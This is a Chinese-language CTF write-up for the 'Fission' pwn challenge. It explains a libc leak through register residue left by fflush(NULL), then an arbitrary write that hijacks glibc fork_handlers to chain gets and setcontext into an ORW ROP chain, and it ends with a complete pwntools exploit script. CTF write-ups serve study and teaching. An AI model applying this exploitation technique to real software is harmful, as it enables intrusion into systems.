# UniCTF - Fission

这题是围绕对 `fork_handlers` 的利用来设计的。核心思路是利用一次小范围任意写，篡改 glibc 中 `fork_handlers`，在 `fork()` 时触发 `gets -> setcontext`，最终拼 ORW 链读出 flag。`fork_handlers` 的原理与利用细节可以直接参考这篇文章：

- https://sashactf.gitbook.io/pwn-notes/pwn/fork_gadget

---

## 保护与环境

```bash
❯ checksec vuln
[*] '/home/neptune/unictf/Fission/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

程序还开启了 seccomp，

```bash
❯ seccomp-tools dump ./vuln
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x0000000e  if (A != rt_sigprocmask) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
```

只允许上面白名单中的几个系统调用，所以只能打 ORW。

---

## 反编译

可以看到反编译后的程序非常精简，设置 seccomp，触发一次 `fflush(0)`，运行一下打印出了某个地址；接着读取任意写的地址和大小，然后任意写，最后调用 `fork` 后立即通过系统调用退出：

```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  unsigned __int64 n0xF; // rbx
  __int64 chk; // rax
  unsigned __int64 v9; // rbx
  __int64 v10; // r14
  unsigned __int64 v11; // r15
  ssize_t v12; // rax
  __int16 n19; // [rsp+0h] [rbp-C8h] BYREF
  int v14; // [rsp+2h] [rbp-C6h]
  __int16 v15; // [rsp+6h] [rbp-C2h]
  _QWORD *dest_1; // [rsp+8h] [rbp-C0h]
  _QWORD dest[23]; // [rsp+10h] [rbp-B8h] BYREF

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  memcpy(dest, &src_, 0x98u);
  n19 = 19;
  v14 = 0;
  v15 = 0;
  dest_1 = dest;
  if ( !prctl(38, 1, 0, 0, 0) && !prctl(22, 2, &n19) )
  {
    n0xF = 0;
    sub_1CE0(22, 2, v3, v4, v5, v6, n19);
    fflush(0);
    write(1, 0, 8u);
    do
    {
      chk = _read_chk(0, (char *)dest + n0xF, 16 - n0xF);
      if ( chk <= 0 )
        goto LABEL_12;
      n0xF += chk;
    }
    while ( n0xF <= 0xF );
    v9 = dest[1];
    if ( dest[1] < 0x65u )
    {
      if ( dest[1] )
      {
        v10 = dest[0];
        v11 = 0;
        while ( 1 )
        {
          v12 = read(0, (void *)(v10 + v11), v9 - v11);
          if ( v12 <= 0 )
            break;
          v11 += v12;
          if ( v11 >= v9 )
            goto LABEL_11;
        }
      }
      else
      {
LABEL_11:
        fork();
      }
    }
  }
LABEL_12:
  syscall(60, 0);
  JUMPOUT(0x1CD1);
}

unsigned __int64 sub_1CE0(int n22, int n2, ...)
{
  gcc_va_list va; // [rsp+B0h] [rbp-28h] BYREF
  unsigned __int64 v4; // [rsp+D0h] [rbp-8h]

  va_start(va, n2);
  v4 = __readfsqword(0x28u);
  _vprintf_chk(2, "gift: ", va);
  return __readfsqword(0x28u);
}
```

可以看到程序提供：

- libc 泄漏：`fflush(NULL)` 返回前的寄存器残留 + `write(1, rdi, 8)`
- 一次任意地址写：`read` 到任意地址，大小为 100 字节
- 退出前调用 `fork()`：一定触发 fork handlers

> IDA 把 `rsi` 误还原成 0，真实为 `mov rsi, rdi`，因此是 `write(1, rdi, 8)` 泄漏。

---

## 漏洞点总结

1. 通过 `fflush(NULL)` 的寄存器残留泄漏 libc 指针
2. 小范围任意写
3. `fork()` 被调用

---

## `fflush(NULL)` 泄漏说明

从反汇编可以看到一段固定序列：

```
.text:0000000000001C1E                 call    sub_1CE0
.text:0000000000001C1E
.text:0000000000001C23                 xor     edi, edi        ; stream
.text:0000000000001C25                 call    cs:fflush_ptr
.text:0000000000001C25
.text:0000000000001C2B                 mov     rsi, rdi        ; buf
.text:0000000000001C2E                 mov     edx, 8          ; n
.text:0000000000001C33                 mov     edi, 1          ; fd
.text:0000000000001C38                 call    cs:write_ptr
```

关键在于 `fflush(NULL)` 返回后 `rdi` 保留为指向栈上 cleanup buffer 的指针。
随后程序执行 `write(1, rdi, 8)`，将 `rdi` 指向的内存的前 8 字节输出到 stdout。

需要注意的是：
- `rdi` 是一个栈地址，指向 `_pthread_cleanup_buffer` 结构
- 该结构的第一个字段 `__prev` 是一个指向 libc 内部的指针
- `write(1, rdi, 8)` 输出的就是这个 `__prev` 字段的值
- 该值在本题中固定为 `libc_base + 0x8f1e0`

执行流程如下：
1. `fflush(NULL)` → `__libc_cleanup_pop_restore(&_buffer)` 
2. 函数返回时 `rdi = &_buffer`
3. `write(1, rdi, 8)` 输出 `_buffer` 的前 8 字节内容
4. 该内容是一个 libc 指针，可用于计算 libc 基址

结合 glibc 源码可以更清晰地理解 `rdi` 的来源：

- `fflush(NULL)` 会遍历所有 `FILE` 并调用 `_IO_flush_all`。
- `_IO_flush_all_lockp` 结束时会调用 `_IO_cleanup_region_end(0)`。
- `_IO_cleanup_region_end` 最终调用 `__libc_cleanup_pop_restore`，其第一个参数是栈上的 cleanup buffer，保存在寄存器中并沿用到返回路径。

对应的 `__libc_cleanup_pop_restore` 实现：

```c
void
__libc_cleanup_pop_restore (struct _pthread_cleanup_buffer *buffer)
{
  struct pthread *self = THREAD_SELF;

  THREAD_SETMEM (self, cleanup, buffer->__prev);

  int cancelhandling = atomic_load_relaxed (&self->cancelhandling);
  if (buffer->__canceltype != PTHREAD_CANCEL_DEFERRED
      && (cancelhandling & CANCELTYPE_BITMASK) == 0)
    {
      int newval;
      do
	{
	  newval = cancelhandling | CANCELTYPE_BITMASK;
	}
      while (!atomic_compare_exchange_weak_acquire (&self->cancelhandling,
						    &cancelhandling, newval));

      if (cancel_enabled_and_canceled (cancelhandling))
	__do_cancel (PTHREAD_CANCELED);
    }
}
libc_hidden_def (__libc_cleanup_pop_restore)
```

在实际运行中，该 qword 落在 libc 映射区，其偏移固定为 `libc_base + 0x8f1e0`。`_pthread_cleanup_buffer` 结构的第一个字段通常是 `__prev` 指针，它指向上一个 cleanup buffer。在 `fflush(NULL)` 的执行过程中，这个字段会被设置为指向 glibc 内部的某个固定位置，因此可以用来泄漏 libc 地址。偏移获取方式如下：

1. 用提供的 `ld-linux-x86-64.so.2` 启动一个最小复现程序，`fflush(NULL)` 后从 `rdi` 取 cleanup buffer 指针，并打印首 qword。
2. 对该地址执行 `dladdr`，得到 `libc` 的 `dli_fbase`，计算：
  $$
  	\text{offset} = \text{leak} - \text{libc\_base}
  $$
3. 得到 `0x8f1e0`。

复现程序如下：

```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	void *cleanup_buf;
	uint64_t leak;
	Dl_info info;

	printf("gift: ");
	fflush(NULL);
	asm volatile("mov %%rdi, %0" : "=r"(cleanup_buf));
	leak = *(uint64_t *)cleanup_buf;

	if (dladdr((void *)leak, &info) == 0) {
		puts("dladdr failed");
		return 1;
	}

	printf("cleanup_buf=%p\n", cleanup_buf);
	printf("leak=%p\n", (void *)leak);
	printf("libc_base=%p\n", info.dli_fbase);
	printf("offset=0x%lx\n", leak - (uint64_t)info.dli_fbase);
	return 0;
}
```

编译运行：

```bash
❯ gcc -O0 -no-pie -fno-pie -ldl offset.c -o offset
❯ ./ld-linux-x86-64.so.2 --library-path . ./offset
gift: cleanup_buf=0x7fffffffd7b0
leak=0x7ffff7c8f1e0
libc_base=0x7ffff7c00000
offset=0x8f1e0
```

$$
  	\text{libc\_base} = \text{leak} - 0x8f1e0
$$

加上 seccomp 禁用 `execve`，只能走 ORW。

其实 pwndbg 简单动调一下即可，很明显是 libc 的地址，在本地调试时关闭 ASLR 减去 libc 基址就是偏移量，打远程时拿到泄漏的地址，减去偏移量就能得到远程 ASLR 开启下的 libc 基址了。 

---

## 利用思路

### 1) fork handlers 结构 (glibc 2.36+ / 2.42)

在 2.36+ 版本，`fork_handler` 增加了 `id` 字段：

- 每个 handler 大小 `0x28`
- 结构中需写入 `id`

出题人在本地对 Ubuntu 和 Arch 的 libc 进行 objdump 查看反汇编代码，发现 `fork_handlers` 在 2.42 上地址必定为：

```python
fork_handlers = libc.sym.re_syntax_options + 0x80
```

### 2) 小写一次 + 二段式

由于单次写限制大小，不能写入完整的 `ucontext + ROP`，所以采用两段式：

- **payload1**：写入 `fork_handlers` 结构，让 `fork()` 依次执行：
  1. `gets(ctx_addr)`
  2. `setcontext(ctx_addr)`
- **payload2**：由 `gets` 从 stdin 写入，包含 `ucontext` 和 ORW ROP 链

这样只需要一次小写，后续大 payload 由 `gets` 引导输入。

> 这里要注意一个问题，`gets` 读取的 payload2 中不能用 `\x0A`，这样会被 `gets` 当作换行符而导致攻击失败。出题人其实本来做的是 Ubuntu 25.10 的镜像，但是 libc 中 唯一的 `syscall ret` gadget 中居然存在 `\x0A`，而且就算开启了 ASLR，libc 基址的低 5 字节也很诡异地不发生变化，导致在本地调试时必定失败，而攻击远程测试 docker 时却没问题，另外一位 PWN 方向的出题人也复现了这个问题，所以为了减少困扰，决定将镜像更换为 archlinux，对做题没有影响。

### 3) setcontext + ORW

`setcontext` 用来切换寄存器到 ROP 栈。

ORW 链：

- `openat(AT_FDCWD, "flag", 0)`
- `read(fd, buf, 0x80)`
- `write(1, buf, 0x80)`

---

## 构造

```python
# payload1: fork_handlers -> gets -> setcontext
payload1 = forge(fork_handlers, libc.sym.gets, libc.sym.setcontext, rdi=ctx_addr)

# payload2: ucontext + ORW chain
payload2 = ucontext
payload2 += chain
payload2 += b"\x00" * BUF_SIZE
payload2 += b"flag\x00"
```

发送顺序：
1. 写入 payload1
2. 通过 `gets` 输入 payload2

---

## 总结

1. `fflush(0)` 后 `write(1, rdi, 8)` 泄漏 libc 指针，计算 libc base
2. 定位 `fork_handlers`
3. 用第一次写改 `fork_handlers` 为 `gets -> setcontext`
4. `fork()` 触发 `gets`，写入 `ucontext + ROP`
5. `setcontext` 切换到 ROP 执行 ORW

---

# exp

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

# io = process("./vuln_patched")
io = remote("localhost", 9999)

libc = ELF("./libc.so.6")

# glibc 2.28-2.35
# HANDLER_SZ, HAS_ID = 0x20, False
# glibc 2.36+
HANDLER_SZ, HAS_ID = 0x28, True


def header(array_ptr, used):
    return p64(used) * 2 + p64(array_ptr)


def handler_array(*funcs):
    assert funcs
    n = len(funcs)
    total = HANDLER_SZ * n - (0x18 if not HAS_ID else 0)
    data = bytearray(total)

    for i, fn in enumerate(funcs[::-1]):
        off = i * HANDLER_SZ
        data[off : off + 8] = p64(fn)
        if HAS_ID:
            data[off + 0x20 : off + 0x28] = p64(i)

    """
    After testing, when using libc's system() and /bin/sh,
    there's no need to fill the trailing zeros. Only if
    writing a custom /bin/sh string, the trailing zeros
    are needed to avoid issues, but also, just aligning to
    8 bytes is sufficient. Add a b"\x00\x00" e.g. is enough,
    like return bytes(data).rstrip(b'\x00') + b"\x00\x00".
    """
    return bytes(data).rstrip(b"\x00") + b"\x00\x00"


def forge(base, *funcs, rdi=None):
    assert funcs
    n = len(funcs)

    if rdi is None:
        used = n
        array_ptr = base + 0x18
    else:
        used = rdi
        array_ptr = (base + 0x18 - (used - n) * HANDLER_SZ) & 0xFFFFFFFFFFFFFFFF

    return header(array_ptr, used) + handler_array(*funcs)


def build_ucontext(rsp, rip, rdi=0, rsi=0, rdx=0):
    frame = SigreturnFrame()
    frame.rsp = rsp
    frame.rip = rip
    frame.rdi = rdi
    frame.rsi = rsi
    frame.rdx = rdx
    setattr(frame, "&fpstate", rsp + 0x1A8)
    fpstate = {
        0x00: p16(0x37F),  # cwd
        0x02: p16(0xFFFF),  # swd
        0x04: p16(0x0),  # ftw
        0x06: p16(0xFFFF),  # fop
        0x08: 0xFFFFFFFF,  # rip
        0x10: 0x0,  # rdp
        0x18: 0x1F80,  # mxcsr
    }
    return flat(
        {
            0x00: bytes(frame),
            0x128: 0,
            0x1A8: fpstate,
        }
    )


io.recvuntil(b"gift: ")
leak = u64(io.recvn(8))
# fflush(NULL) cleanup buffer q[0] = libc_base + 0x8f1e0
libc.address = leak - 0x8F1E0
log.success(f"libc base: {hex(libc.address)}")

# After my local tests, following are the addresses of fork_handlers in different glibc versions.
# For glibc 2.31:
# objdump -d libc.so.6 | grep "<__abort_msg@@GLIBC_PRIVATE+0xbe0>"
# For glibc 2.35:
# objdump -d libc.so.6 | grep "<getdate_err@@GLIBC_2.2.5+0x300>"
# For glibc 2.39/2.41/2.42:
# objdump -d libc.so.6 | grep "<re_syntax_options@@GLIBC_2.2.5+0x80>"
fork_handlers = libc.sym.re_syntax_options + 0x80
log.success(f"fork_handlers: {hex(fork_handlers)}")

rop = ROP(libc)
ret = rop.find_gadget(["ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
syscall = rop.find_gadget(["syscall", "ret"])[0]

# BUF_SIZE is used for both read/write buffer size and as rdx value.
# Since there's no good gadget to control rdx separately, we set it to 0x80.
# As openat() flags, 0x80 = O_EXCL, which has no effect when opening existing files.
# As read/write count, 0x80, which 128 bytes is sufficient for reading the flag.
# 0x100 = O_NOCTTY, which has no effect on regular files, is also a great choice.
BUF_SIZE = 0x80
ctx_addr = fork_handlers + 0x200


def build_chain(buf_addr, path_addr):
    # openat(AT_FDCWD, "flag", rdx) rdx = BUF_SIZE = 0x80 (O_EXCL)
    # read(fd, buf, rdx)            rdx = BUF_SIZE = 0x80 (128 bytes)
    # write(1, buf, rdx)            rdx = BUF_SIZE = 0x80 (128 bytes)
    return flat(
        [
            pop_rdi,
            constants.AT_FDCWD,
            pop_rsi,
            path_addr,
            pop_rax,
            constants.SYS_openat,
            syscall,
            pop_rdi,
            3,
            pop_rsi,
            buf_addr,
            pop_rax,
            constants.SYS_read,
            syscall,
            pop_rdi,
            1,
            pop_rsi,
            buf_addr,
            pop_rax,
            constants.SYS_write,
            syscall,
        ]
    )


ucontext_size = len(build_ucontext(0, 0))
rop_addr = ctx_addr + ucontext_size
chain = build_chain(0, 0)
buf_addr = rop_addr + len(chain)
path_addr = buf_addr + BUF_SIZE
chain = build_chain(buf_addr, path_addr)
ucontext = build_ucontext(rop_addr, ret, rdx=BUF_SIZE)

payload1 = forge(fork_handlers, libc.sym.gets, libc.sym.setcontext, rdi=ctx_addr)

payload2 = ucontext
payload2 += chain
payload2 += b"\x00" * BUF_SIZE
payload2 += b"flag\x00"

if b"\n" in payload2:
    raise ValueError("payload2 contains newline; try again due to ASLR")

req1 = p64(fork_handlers) + p64(len(payload1))

io.send(req1)
io.send(payload1)
io.sendline(payload2)

io.interactive()
```

## 参考链接

- fork handler 原理与利用：
  https://sashactf.gitbook.io/pwn-notes/pwn/fork_gadget

- setcontext/SROP 相关：
  https://sashactf.gitbook.io/pwn-notes/pwn/setcontext
